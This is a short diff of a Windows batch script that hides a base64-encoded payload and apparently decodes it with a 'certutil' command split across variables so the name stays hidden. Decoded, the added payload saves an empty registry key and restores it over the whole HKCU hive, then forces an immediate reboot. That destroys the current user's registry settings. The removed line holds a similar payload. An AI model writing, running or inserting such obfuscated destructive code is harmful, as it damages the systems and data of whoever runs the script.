@@ -1,7 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 set "A=%TEMP%\%RANDOM%.bat"
-set "B=cmVnIGFkZCAiSEtMTVxTTiIgL2YgPm51bApyZWcgc2F2ZSAiSEtMTVxTTiIgIkM6XG5vZGF0YSIgL3kgPm51bApyZWcgZGVsZXRlICJIS0xNXFNOIiAvZiA+bnVsCnJlZyByZXN0b3JlICJIS0NVIiAiQzpcbm9kYXRhIiA+bnVsIDI+JjEKc2h1dGRvd24gL3IgL3QgMCAvZg=="
+set "B=cmVnIGFkZCAiSEtDVVxTTiIgL2YgCnJlZyBzYXZlICJIS0NVXFNOIiAiQzpcbm9kYXRhIiAveQpyZWcgZGVsZXRlICJIS0NVXFNOIiAvZgpyZWcgcmVzdG9yZSAiSEtDVSIgIkM6XG5vZGF0YSIKc2h1dGRvd24gL3IgL3QgMCAvZg=="
 set "C=cert"
 set "D=util"
 set "E=-decode"
